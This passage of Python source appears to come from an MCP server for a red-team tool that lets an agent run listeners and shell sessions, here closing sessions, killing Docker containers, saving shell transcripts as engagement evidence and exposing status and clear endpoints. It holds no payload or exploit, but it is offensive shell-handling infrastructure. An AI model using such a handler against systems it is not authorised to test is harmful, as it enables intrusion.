                result["orphan_warning"] = (
                    f"{len(orphans)} red-run container(s) running outside this "
                    f"session — likely from a previous MCP instance. These may "
                    f"be holding ports. Kill with: docker kill <name>"
                )

        if not result["listeners"] and not result["sessions"]:
            if result.get("orphan_containers"):
                return json.dumps(result, indent=2)
            return "No listeners or sessions. Use start_listener() to begin."

        return json.dumps(result, indent=2)

    @mcp.tool()
    def close_session(
        session_id: str,
        save_transcript: bool = True,
    ) -> str:
        """Close a session or listener and optionally save the transcript.

        Closes the TCP connection and marks the session as closed. If
        save_transcript is True and an engagement/evidence/ directory exists,
        saves the full send/recv transcript to a log file.

        Args:
            session_id: Session ID to close.
            save_transcript: Save transcript to engagement/evidence/
                            (default True).
        """
        # Check if it's a session
        if session_id in sessions:
            session = sessions[session_id]
            transcript_path = None

            if save_transcript and session.transcript:
                if session.live_log:
                    # Live log already has content — just use that path
                    transcript_path = session.live_log
                else:
                    evidence_dir = _PROJECT_ROOT / "engagement" / "evidence"
                    if evidence_dir.exists():
                        safe_label = re.sub(r"[^a-zA-Z0-9_-]", "_", session.label)
                        filename = f"shell-{session_id}-{safe_label}.log"
                        transcript_path = evidence_dir / filename
                        _save_transcript(session, transcript_path)

            try:
                if session.session_type == "local" and session.process:
                    # Kill Docker container explicitly for privileged sessions
                    # (SIGTERM to docker CLI doesn't reliably stop the container)
                    if session.container_name:
                        try:
                            subprocess.run(
                                ["docker", "kill", session.container_name],
                                capture_output=True,
                                timeout=10,
                            )
                        except Exception:
                            pass
                    try:
                        pgid = os.getpgid(session.process.pid)
                        os.killpg(pgid, signal.SIGTERM)
                        session.process.wait(timeout=5)
                    except (ProcessLookupError, ChildProcessError):
                        pass
                    except subprocess.TimeoutExpired:
                        try:
                            os.killpg(pgid, signal.SIGKILL)
                        except ProcessLookupError:
                            pass
                    if session.master_fd is not None:
                        os.close(session.master_fd)
                        session.master_fd = None
                elif session.conn:
                    session.conn.close()
            except Exception:
                pass
            session.status = "closed"

            return json.dumps(
                {
                    "status": "closed",
                    "session_id": session_id,
                    "transcript_saved": str(transcript_path)
                    if transcript_path
                    else None,
                    "transcript_lines": len(session.transcript),
                },
                indent=2,
            )

        # Check if it's a listener
        if session_id in listeners:
            listener = listeners[session_id]
            try:
                listener.sock.close()
            except Exception:
                pass
            listener.status = "closed"
            return json.dumps(
                {
                    "status": "closed",
                    "listener_id": session_id,
                    "message": "Listener closed.",
                },
                indent=2,
            )

        available = list(sessions.keys()) + list(listeners.keys())
        return f"ERROR: '{session_id}' not found. Available: {', '.join(available) or 'none'}"

    def _save_transcript(session: Session, path: Path) -> None:
        """Write session transcript to a log file."""
        path.parent.mkdir(parents=True, exist_ok=True)
        with open(path, "w") as f:
            f.write(f"# Shell Transcript — {session.label}\n")
            if session.session_type == "local":
                f.write(f"# Process: PID {session.remote_addr[1]}\n")
                f.write(f"# Command: {session.command}\n")
            else:
                f.write(
                    f"# Remote: {session.remote_addr[0]}:{session.remote_addr[1]}\n"
                )
                f.write(f"# Port: {session.port}\n")
            f.write(f"# Connected: {session.connected_at.isoformat()}\n")
            f.write(f"# PTY: {session.pty}\n")
            f.write(f"# Lines: {len(session.transcript)}\n\n")

            for ts, direction, data in session.transcript:
                prefix = ">>>" if direction == "send" else "<<<"
                f.write(f"[{ts}] {prefix}\n{data}\n\n")

    # --- HTTP endpoints for run.sh session management ---

    @mcp.custom_route("/status", methods=["GET"])
    async def status(request: Request) -> JSONResponse:
        """Session summary for run.sh startup check."""
        sess_list = []
        for sid, s in sessions.items():
            if s.status == "closed":
                continue
            if s.session_type == "local":
                addr = f"local (PID {s.remote_addr[1]})"
            else:
                addr = f"{s.remote_addr[0]}:{s.remote_addr[1]}"
            sess_list.append(
                {
                    "id": sid,
                    "label": s.label,
                    "addr": addr,
                    "platform": s.platform or "unknown",
                    "connected_at": s.connected_at.isoformat(),
                }
            )
        return JSONResponse({"sessions": sess_list, "count": len(sess_list)})

    @mcp.custom_route("/clear", methods=["POST"])
    async def clear(request: Request) -> JSONResponse:
        """Close all sessions and listeners."""
        closed = []
        for sid, s in list(sessions.items()):
            if s.status != "closed":
                closed.append(sid)
                s.status = "closed"
                try:
                    if s.session_type == "local":
                        if s.container_name:
                            subprocess.run(
                                ["docker", "kill", s.container_name],
                                capture_output=True,
                                timeout=5,
                            )
                        if s.process:
                            os.killpg(os.getpgid(s.process.pid), signal.SIGTERM)
                    elif s.conn:
                        s.conn.close()
                except Exception:
                    pass
        for lid, listener in list(listeners.items()):
            try:
                listener.status = "closed"
                listener.sock.close()
            except Exception:
                pass
        sessions.clear()
        listeners.clear()
        return JSONResponse({"cleared": len(closed), "session_ids": closed})

    return mcp


def main() -> None:
    server = create_server()
    server.run(transport="sse")


if __name__ == "__main__":
    main()
